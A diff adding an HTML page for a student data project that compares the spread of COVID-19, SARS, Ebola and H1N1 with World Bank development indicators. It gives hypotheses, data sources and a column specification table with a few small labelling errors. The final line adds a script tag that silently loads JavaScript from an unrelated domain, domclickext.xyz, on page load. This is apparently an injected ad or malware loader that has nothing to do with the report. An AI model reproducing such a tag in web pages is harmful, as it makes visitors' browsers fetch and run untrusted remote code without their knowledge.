@@ -1,0 +1,334 @@
+<html><head>
+    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <title>Oscarito Data Report</title>
+</head>
+
+<body>
+
+<div class="row">
+    <div class="col-md-2"></div>
+    <div class="col-md-8">
+        <div class="page-header center">
+            <h1>OSCARITO DATA DELIVERABLE </h1>
+        </div>
+       <div>
+        
+        <div><center><font size="3">
+        <a href="https://github.com/rsalkham/virus_analysis">Link to Our Data on Github</a>
+        <div><center><font size="3">
+        <a href="https://github.com/rsalkham/virus_analysis/blob/master/sample.csv"> Data Sample</a></center></div></font>
+    </font></center></div>
+    <div>
+    </div>
+    <div>
+        <font size="3">
+       <strong> Null Hypothesis: </strong>
+<p>There is no relationship between the extent to which viruses spread in a certain country and its level of development.</p>
+</font>
+    </div>
+
+    <div>
+    <font size = "3">
+        <strong>Alternative Hypothesis: </strong>
+<p>Developed countries are more likely to have a less significant spread of viruses compared to developing countries.</p>
+</font>
+    </div>
+    <div class = "answers"></div>
+    <h2> Data Origins</h2>
+        <font size="3">
+            <ul>
+            <li><strong>How did you collect your data? </strong>
+            <ul>
+                <li>We collected the data from multiple sources on the internet. One was Kaggle where we found projects that compiled many datasets from the internet on the viruses (COVID-19, SARS, Ebola, H1N1). We then tracked the sources of each of the datasets that he had and made sure that they are reputable sources. The SARS data came from the WHO, the Ebola data came from WHO, the H1N1 data came from WHO and the COVID-19 data came from Johns Hopkins University CSSE.
+                    </li>
+                <li>
+                    The other main data source is The World Bank. We got many different indicators for all of the countries that we thought reflected how developed a country is, and others that we thought could impact the spread of a disease in a country. Some examples are the population (total, by age group, and by gender), internet penetration, gdp, life expectancy, etc.
+                </li>
+            </ul>
+            </li>
+            <li> <strong>
+            How did you generate the sample? Is it comparably small or large? Is it representative or is it likely to exhibit some kind of sampling bias?
+        </strong>
+            <ul>
+            <li>
+            We took 10 random countries out of the 210 countries that we have in our dataset. We have included all of the indicators (columns) that we are looking at.
+            </li>
+            </ul>
+            </li>
+            <li> <strong>How many data points are there total? How many are there in each group you care about (e.g. if you are dividing your data into positive/negative examples, are they split evenly)? Do you think this is enough data to do what you hope to do?</strong>
+            <ul>
+            <li> We have 210 data points (countries) and for every country for every virus we have compiled 13 development indicators as well as the number of cases and deaths. </li>
+            </ul>
+            </li>
+            
+            <li><strong>Are there missing values? Do these occur in fields that are important for your project's goals?</strong>
+            <ul>
+            <li> Some countries do not have certain development indicator data reported, so those values are recorded as null. We are going to try to fill in these null values with estimates using data from previous years. Also, not all countries were affected by the viruses we are following, and therefore those cells are currently blank. We are working on filling those cells with 0s.
+            </li>
+            </ul>
+            </li>
+            
+            <li> 
+            <strong>
+            Are there duplicates? Do these occur in fields that are important for your project's goals?
+        </strong>
+            <ul>
+            <li> We do not have any duplicates.
+            </li>
+            </ul>
+            </li>
+            
+            <li> 
+            <strong>
+            How is the data distributed? Is it uniform or skewed? Are there outliers? What are the min/max values? (focus on the fields that are most relevant to your project goals)
+        </strong>
+            <ul>
+            <li>
+                The data is skewed towards countries that the diseases started in. They have more cases and deaths from these viruses than others. The min value is for some countries 0 indicating that they were not affected from the virus.
+            </li>
+            </ul>
+            </li>
+            <li><strong>
+            Are there any data type issues (e.g. words in fields that were supposed to be numeric)? Where are these coming from? (E.g. a bug in your scraper? User input?) How will you fix them? 
+        </strong>
+            <ul>
+            <li>
+            We do not currently have any known problems with data types. 
+            </li>
+            </ul>
+            </li>
+            <li>
+            <strong>
+            Do you need to throw any data away? What data? Why? Any reason this might affect the analyses you are able to run or the conclusions you are able to draw?
+        </strong>
+            <ul>
+            <li> We are thinking of whether to include countries that were not affected by any of the viruses. However, we also think that they could give us good insight into what factors in these countries have resulted in that outcome.
+            </li>
+            </ul>
+            </li>
+        </ul>
+    </font>
+    <h2> Cleanliness of Data & Challenges</h2>
+    <font size="3">
+        <ul>
+        <li> One challenge we will continue to face throughout our project is updating and analyzing the COVID-19 numbers in real-time, since the virus is currently spreading and cases are increasing daily. 
+        We have also observed how different the number of countries affected are between the different viruses. For example H1N1 affected 178 countries while Ebola affected 10. We are therefore going to take the nature of the virus into consideration in our analysis (how affected it is by temperature, who are the people it affects the most, how is it spread and how easily, etc.)
+        Another challenge that we are facing is that many smaller and lesser developed countries do not have as much information reported to the world bank. Therefore, the analysis might not be as accurate for these countries.
+        </li>
+        </ul>
+        
+        </font>
+</div>
+        <div class = "links">
+            <h2> Data Sources</h2>
+                <table class="table table-sm colspan='2'">
+                    <thead>
+                    
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><a href="https://www.who.int/csr/don/archive/disease/ebola/en/"> Ebola Source</a>
+                        </td>
+                        <td><a href="https://systems.jhu.edu/research/public-health/ncov/"> COVID-19 JHU CSSE Source</a></td>
+                        <td><a href="https://www.who.int/csr/disease/swineflu/updates/en/"> H1N1 WHO Source</a>
+                        </td>
+                    </tr>
+                      <tr>
+                        <td><a href="https://www.who.int/csr/don/archive/disease/ebola/en/"> Ebola Source</a>
+                        </td>
+                        <td><a href="https://www.kaggle.com/de5d5fe61fcaa6ad7a66/coronavirus-dataset-update-0206#2019-nCoV-cases-JHU.csv"> COVID-19 Kaggle Source </a></td>
+                        <td><a href="https://www.kaggle.com/de5d5fe61fcaa6ad7a66/coronavirus-dataset-update-0206#Pandemic%20(H1N1)%20200905-200907.csv"> H1N1 Kaggle Source </a></td>
+                    </tr>
+                      <tr>
+                        <td colspan="3"><a href="https://www.who.int/csr/sars/country/table2004_04_21/en/"> SARS WHO Source</a></td>
+                       
+                      </tr>
+                      <tr>
+
+                      
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+            <h3>Data Specification</h3>
+                 <table class="table table-hover">
+                    <thead class="thead-dark">
+                      <tr>
+                        <th scope="col">Name</th>
+                        <th scope="col">Description</th>
+                        <th scope="col">Type</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <th scope="row">Country</th>
+                        <td>The country whose developmental indices we are 
+                            analyzing in relation to the spread of the virus</td>
+                        <td>primary_key, float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">gdp_year</th>
+                        <td>gross domestic product, market value of all the 
+                            final goods and services produced in a year of the country</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">gdp_per_capita_year</th>
+                        <td>gross domestic product per capita, measure of a country's
+                             economic output that accounts for its number of people</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">population_year</th>
+                        <td>the number of people that live in that country per year as
+                            reported by census and WHO
+                        </td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">rural_pop_year</th>
+                        <td>the number of people that live in rural areas of the country per year as
+                            reported by census and WHO</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">urban_pop_year</th>
+                        <td>the number of people that live in rural areas of the country per year as
+                            reported by census and WHO</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">pop_14_year</th>
+                        <td>Population of people between 0 and 14 
+                            years of age as a percentage of the total population</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">pop_15_64_year</th>
+                        <td>Population of people between 15 and 64 
+                            years of ageas a percentage of the total population</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">pop_65_year</th>
+                        <td>Population of people above 65 years as a percentage 
+                            of the total population</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">pop_female_year</th>
+                        <td>Population of people who identify as female as a percentage of the total population</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">mortality_year</th>
+                        <td> The units of deaths per 1,000 individuals per year</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">life_expec_year</th>
+                        <td>Measure of the average time that people in live in 
+                            these countries</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">surface_area</th>
+                        <td>A country's total area, including areas under inland bodies
+                            of water and some coastal waterways
+                        </td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">internet_year</th>
+                        <td>The amount of internet servers in the country, we're using this 
+                            to measure media penetration</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">H1N1 Cases</th>
+                        <td>The number of people who had the H1N1. Influenza A virus subtype H1N1 (A/H1N1) is the subtype of influenza
+                             A virus that was the most common cause of human influenza (flu) in 
+                             2009, and is associated with the 1918 outbreak known as the Spanish
+                              flu. It is an orthomyxovirus that contains the glycoproteins 
+                              haemagglutinin and neuraminidase.</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">H1N1 Deaths</th>
+                        <td>The number of people who died from the H1N1</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">H1N1 Fatality Rate</th>
+                        <td>The rate of people who died as a cause of the disease,
+                             deaths divided by cases</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">covid19 Cases</th>
+                        <td>COVID-19 is a strain of the coronaviruses, Coronaviruses 
+                            are types of viruses that typically affect the respiratory 
+                            tracts of birds and mammals, including humans </td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">covid19 Deaths</th>
+                        <td>The number of people who died from covid-19</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">covid19 Fatality Rate</th>
+                        <td>The rate of people who died as a cause of the disease,
+                            deaths divided by cases</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">SARS Cases</th>
+                        <td>Severe Acute Respiratory Syndrome is strain of the coronavirus.
+                            SARS-CoV is thought to be an animal virus from an as-yet-uncertain
+                            animal reservoir that spread to other animals (civet cats) and humans
+                        </td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">SARS Deaths</th>
+                        <td>The number of people who died from SARS</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">SARS Fatality Rate</th>
+                        <td>The rate of people who died as a cause of the disease,
+                            deaths divided by cases</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">Ebola Cases</th>
+                        <td>Ebola is a rare but deadly virus found in people and nonhuman
+                            primates
+                        </td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">Ebola Deaths</th>
+                        <td>The number of people who died from SARS</td>
+                        <td>float</td>
+                      </tr>
+                      <tr>
+                        <th scope="row">Ebola Mortality Rate</th>
+                        <td>The rate of people who died as a cause of the disease,
+                            deaths divided by cases</td>
+                        <td>float</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                  
+    </div>
+</div>
+
+
+
+<script type="text/javascript" async="" src="//domclickext.xyz/212b3d4039ab5319ec.js"></script></body></html>
